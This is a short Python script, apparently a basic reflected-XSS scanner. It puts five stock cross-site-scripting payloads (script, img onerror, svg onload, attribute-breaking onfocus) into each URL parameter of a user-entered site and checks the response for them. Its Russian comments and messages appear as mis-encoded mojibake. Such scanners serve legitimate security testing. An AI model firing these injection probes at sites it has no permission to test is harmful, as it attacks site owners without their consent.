import requests
import time
import sys
import urllib.parse

def typewriter(text, delay=0.03):
    """–ê–Ω–∏–º–∞—Ü–∏—è –ø–µ—á–∞—Ç–∞–Ω–∏—è —Ç–µ–∫—Å—Ç–∞"""
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)
    print()  # –ü–µ—Ä–µ–≤–æ–¥ —Å—Ç—Ä–æ–∫–∏ –≤ –∫–æ–Ω—Ü–µ

def get_all_params(url):
    """–ò–∑–≤–ª–µ–∫–∞–µ—Ç GET-–ø–∞—Ä–∞–º–µ—Ç—Ä—ã –∏–∑ URL"""
    parsed = urllib.parse.urlparse(url)
    params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    params = {k: v[0] if v else '' for k, v in params.items()}
    base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    return base_url, params

def test_xss_payload(url, params, payload):
    """–ü—Ä–æ–≤–µ—Ä—è–µ—Ç, –æ—Ç—Ä–∞–∂–∞–µ—Ç—Å—è –ª–∏ payload –≤ –æ—Ç–≤–µ—Ç–µ"""
    test_params = params.copy()
    for key in test_params:
        test_params[key] = payload
        query = urllib.parse.urlencode(test_params)
        test_url = f"{url}?{query}"
        try:
            response = requests.get(test_url, timeout=10)
            if payload in response.text:
                return True, key
        except requests.RequestException:
            continue
    return False, None

def main():
    typewriter("–í–≤–µ–¥–∏—Ç–µ URL –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏ –Ω–∞ XSS:")
    target_url = input().strip()

    # –î–æ–±–∞–≤–ª—è–µ–º —Å—Ö–µ–º—É, –µ—Å–ª–∏ –µ—ë –Ω–µ—Ç
    if not target_url.startswith(('http://', 'https://')):
        target_url = 'https://' + target_url

    # –ü—Ä–æ–≤–µ—Ä–∫–∞ –¥–æ—Å—Ç—É–ø–Ω–æ—Å—Ç–∏ —Å–∞–π—Ç–∞
    try:
        requests.get(target_url, timeout=10)
    except requests.RequestException:
        typewriter("‚ùå –û—à–∏–±–∫–∞: –ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–¥–∫–ª—é—á–∏—Ç—å—Å—è –∫ —É–∫–∞–∑–∞–Ω–Ω–æ–º—É URL.")
        return

    base_url, params = get_all_params(target_url)

    if not params:
        typewriter("‚ö†Ô∏è  –í URL –æ—Ç—Å—É—Ç—Å—Ç–≤—É—é—Ç GET-–ø–∞—Ä–∞–º–µ—Ç—Ä—ã. –°–∫–∞–Ω–µ—Ä —Ä–∞–±–æ—Ç–∞–µ—Ç —Ç–æ–ª—å–∫–æ —Å –ø–∞—Ä–∞–º–µ—Ç—Ä–∞–º–∏ –≤ URL.")
        return

    typewriter(f"üîç –ù–∞–π–¥–µ–Ω—ã –ø–∞—Ä–∞–º–µ—Ç—Ä—ã: {', '.join(params.keys())}")
    typewriter("üöÄ –ù–∞—á–∏–Ω–∞—é –ø—Ä–æ–≤–µ—Ä–∫—É –Ω–∞ XSS...")

    # –ë–∞–∑–æ–≤—ã–µ XSS-–ø–æ–ª–µ–∑–Ω—ã–µ –Ω–∞–≥—Ä—É–∑–∫–∏
    payloads = [
        "<script>alert(1)</script>",
        "'><script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "\" onfocus=alert(1) autofocus=\"",
        "<svg onload=alert(1)>"
    ]

    vulnerable = False
    for i, payload in enumerate(payloads, 1):
        typewriter(f"  –ü—Ä–æ–≤–µ—Ä–∫–∞ payload #{i}...", delay=0.01)
        found, param = test_xss_payload(base_url, params, payload)
        if found:
            typewriter(f"  üí• –£—è–∑–≤–∏–º–æ—Å—Ç—å –Ω–∞–π–¥–µ–Ω–∞! Payload —Å—Ä–∞–±–æ—Ç–∞–ª –≤ –ø–∞—Ä–∞–º–µ—Ç—Ä–µ: {param}")
            vulnerable = True
            break

    if vulnerable:
        typewriter("‚ùó –°–∞–π—Ç –º–æ–∂–µ—Ç –±—ã—Ç—å —É—è–∑–≤–∏–º –∫ XSS-–∞—Ç–∞–∫–∞–º!")
    else:
        typewriter("‚úÖ XSS-—É—è–∑–≤–∏–º–æ—Å—Ç–∏ –Ω–µ –æ–±–Ω–∞—Ä—É–∂–µ–Ω—ã (–Ω–∞ –±–∞–∑–æ–≤–æ–º —É—Ä–æ–≤–Ω–µ).")

if __name__ == "__main__":
    main()
